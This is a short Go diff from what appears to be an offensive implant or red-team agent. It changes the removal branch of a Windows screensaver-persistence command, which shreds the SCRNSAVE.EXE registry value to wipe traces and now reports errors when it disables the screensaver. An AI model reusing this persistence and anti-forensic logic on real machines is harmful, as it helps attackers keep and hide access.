@@ -132,9 +132,14 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 		// Shred the screensaver executable path before deletion
 		shredRegistryValue(key, "SCRNSAVE.EXE")
 		// Disable screensaver
-		_ = key.SetStringValue("ScreenSaveActive", "0")
+		result := "Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value"
+		if err := key.SetStringValue("ScreenSaveActive", "0"); err != nil {
+			result += fmt.Sprintf("\n  [!] Warning: failed to disable screensaver: %v", err)
+		} else {
+			result += "\n  Disabled screensaver (ScreenSaveActive = 0)"
+		}
 
-		return successf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)")
+		return successResult(result)
 
 	default:
 		return errorf("unknown action '%s'. Use: install or remove", args.Action)
